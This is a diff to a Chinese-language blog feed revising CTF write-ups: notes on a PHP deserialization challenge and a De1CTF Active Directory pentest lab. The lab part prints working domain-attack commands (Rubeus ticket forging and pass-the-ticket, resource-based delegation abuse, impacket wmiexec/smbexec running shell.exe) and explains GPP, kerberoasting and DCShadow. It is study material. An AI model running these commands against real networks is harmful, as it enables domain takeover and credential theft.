@@ -10,13 +10,18 @@
 
 <p>很意外为啥把上面的3改成2就好了，</p>
 <p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510195659225.png" alt="image-20200510195659225"></p>
-<p>然后在本地试了试，好像跟php的版本还有问题，</p>
+<p>然后在本地试了试，好像跟php的版本和SAPI有关，</p>
+<p>php以cli方式运行时候是不用修改3变成2的，本地测试php7.2.1和7.3.15版本将protected改成public属性是可以成功的，其他版本不可以</p>
 <ul>
-<li>php7</li>
+<li>php 7.2.1</li>
 </ul>
 <p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510200611561.png" alt="image-20200510200611561"></p>
 <ul>
-<li>php5</li>
+<li>php 7.1.13</li>
+</ul>
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511100804614.png" alt="image-20200511100804614"></p>
+<ul>
+<li>php 5.3.29</li>
 </ul>
 <p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510200642881.png" alt="image-20200510200642881"></p>
 <p>然后本地7版本时候，不用把3改成2也可以，但是在题目环境不改3的话不能成功。虚拟机里也是和题目环境一样。</p>
@@ -24,7 +29,15 @@
 <p>win 10 phpstudy php7.2.1</p>
 <p>ps：添加了一个var_dump(scandir(‘.’));输出的试php.exe的路径。</p>
 <p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510202256996.png" alt="image-20200510202256996"></p>
-<p>phpstudy其他版本均读不了flag文件。</p>
+<p>这里是apache的原因，如果要读的话要用绝对路径</p>
+<blockquote>
+<p><strong>Note</strong>:</p>
+<p>析构函数在脚本关闭时调用，此时所有的 HTTP 头信息已经发出。脚本关闭时的工作目录有可能和在 SAPI（如 apache）中时不同。</p>
+<p><a href="https://www.php.net/manual/zh/language.oop5.decon.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.decon.php</a></p>
+</blockquote>
+<p>另外如果把3改成2的话也是可以读的</p>
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511095452622.png" alt="image-20200511095452622"></p>
+<p>phpstudy7.2.10外其他版本均读不了flag文件。</p>
 <h1 id="0x02-filejava"><a href="#0x02-filejava" class="headerlink" title="0x02 filejava"></a>0x02 filejava</h1><p>上传完文件可以看下载文件处有任意文件读取漏洞，</p>
 <p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510214503572.png" alt="image-20200510214503572"></p>
 <p>都配置文件</p>
@@ -85,9 +98,18 @@
   <entry>
     <title>De1ctf Hard_Pentest_2</title>
     <url>/2020/05/09/De1ctf-pentest2/</url>
-    <content><![CDATA[<p>前面De1ctf的Hard_Pentest_2，复现记录</p>
+    <content><![CDATA[<p>DE1CTF题目的环境持续开了一周的时间，然后用了六天的时间才复现完一道题，是一道涉及域渗透的题目，和出</p>
+<p>题人咨询，好像题目环境也有点问题，按他的writeup不能成功，然后自己查资料后，最后成功提权，但是最后一</p>
+<p>步拿到域控试了半天还是没有成功。由于之前也是没有学过域渗透这方面，借着他的环境边学习边实践，学到了很</p>
+<p>多知识点和一些工具的使用，对域渗透也是有了一点了解，题目巧妙地结合了域渗透的一系列知识点。</p>
 <a id="more"></a>
 
+<ul>
+<li>GPP漏洞：组策略选项（GPP）给域成员添加的账户信息会保存在SYSVOL文件夹中，使用微软公开的密钥可以直接解密出密码。</li>
+<li>kerberoasting：如果当前拥有一个普通的域用户权限且对一个用户有写入spn(ServicePrincipalNames)的权限,就可以进行kerberoasting攻击，可以通过爆破得到对应用户的密码。</li>
+<li>基于资源的约束委派攻击：个人理解，传统的约束委派是通过msDS-AllowedToDelegateTo 设置了当前可以委派的对象，即我可以委派谁；不同于传统的约束委派，基于资源的约束委派是通过msDS-AllowedToActOnBehalfOfOtherIdentity来设置谁可以委派我。个人认为原理就是伪造TGS。</li>
+<li>DCshadow:利用域控之间的数据同步推送，向活动目录数据库中注入恶意数据对象，原理还不是很懂,当有特殊的一些扩展权限就可以利用DCshadow，修改primaryGroupID属性，变成域控。</li>
+</ul>
 <h1 id="Hard-Pentest-2"><a href="#Hard-Pentest-2" class="headerlink" title="Hard_Pentest_2"></a>Hard_Pentest_2</h1><p><img src="/2020/05/09/De1ctf-pentest2/image-20200504160434565.png" alt="image-20200504160434565"></p>
 <p>提示了de1ta的权限，然后利用AdFind.exe查一下，执行</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -sc getacls -sddlfilter ;;;;;de1ctf2020\web -recmute</span><br><span class="line">AdFind.exe -s subtree -b &quot;cn&#x3D;de1ta,cn&#x3D;users,dc&#x3D;DE1CTF2020,dc&#x3D;lab&quot; -sc getacl -sddl++ -recmute</span><br></pre></td></tr></table></figure>
@@ -306,8 +328,7 @@
 <p>之后请求一个TGT,并导入会话中，</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash &#x2F;user:de1ta &#x2F;password:3f23ea12 &#x2F;domain:De1CTF2020.lab</span><br></pre></td></tr></table></figure>
 
-
-
+<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508082613787.png" alt></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:de1ta /rc4:B03094996601324646AC223BF30D0D07 /ptt</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/05/09/De1ctf-pentest2/image-20200507225359017.png" alt="image-20200507225359017"></p>
@@ -328,7 +349,7 @@
 
 <p><img src="/2020/05/09/De1ctf-pentest2/image-20200508100355469.png" alt="image-20200508100355469"></p>
 <p>然后在生成对应的白银票据（伪造的tgs）,参考先知的<a href="https://xz.aliyun.com/t/7454" target="_blank" rel="noopener">文章要</a>分别生成（cifs,host）两个票据，这里采用rubeus.exe来进行基于资源的约束委派利用，因为rubeus.exe不支持明文，所以首先生成hash。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash /user:evil /password:evil /domain:De1CTF2020.lab</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash /user:mount /password:mount /domain:De1CTF2020.lab</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/05/09/De1ctf-pentest2/image-20200508090928722.png" alt="image-20200508090928722"></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:mount$ /rc4:A7BD777076A164E74E418F0913174929 /impersonateuser:Administrator /msdsspn:cifs/dm /ptt </span><br><span class="line"></span><br><span class="line">Rubeus.exe s4u /user:mount /rc4:A7BD777076A164E74E418F0913174929 /impersonateuser:administrator /msdsspn:host/dm /ptt </span><br><span class="line"><span class="meta">#</span><span class="bash">rubeus的用法参考 https://github.com/GhostPack/Rubeus<span class="comment">#s4u</span></span></span><br></pre></td></tr></table></figure>
@@ -344,7 +365,7 @@
 
 <p>然后开始用impacket，这里要用pyinstaller把impacket的程序打包，github上面也有现成的，</p>
 <blockquote>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getST.py -dc-ip 192.168.0.12 -spn cifs/dm -impersonate Administrator de1ctf2020.lab/mount:mount</span><br><span class="line"><span class="meta">$</span><span class="bash">env:KRB5CCNAME=<span class="string">"Administrator.ccache"</span></span></span><br><span class="line">.\wmiexec.exe -no-pass -k dm shell.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getST.exe -dc-ip 192.168.0.12 -spn cifs/dm -impersonate Administrator de1ctf2020.lab/mount:mount</span><br><span class="line"><span class="meta">$</span><span class="bash">env:KRB5CCNAME=<span class="string">"Administrator.ccache"</span></span></span><br><span class="line">.\wmiexec.exe -no-pass -k dm shell.exe</span><br></pre></td></tr></table></figure>
 </blockquote>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getst.exe -dc-ip 192.168.0.12 -spn cifs/dm -impersonate Administrator de1ctf2020.lab/mount:mount</span><br><span class="line"></span><br><span class="line">setenv KRB5CCNAME  Administrator.ccache</span><br><span class="line"></span><br><span class="line">wmiexec.exe -no-pass -k -debug dm shell.exe</span><br><span class="line"><span class="meta">#</span><span class="bash">或</span></span><br><span class="line">smbexec.exe -no-pass -k -debug dm  </span><br><span class="line"><span class="meta">#</span><span class="bash">或</span></span><br><span class="line">PsExec64.exe  \\dm -s cmd</span><br></pre></td></tr></table></figure>
 
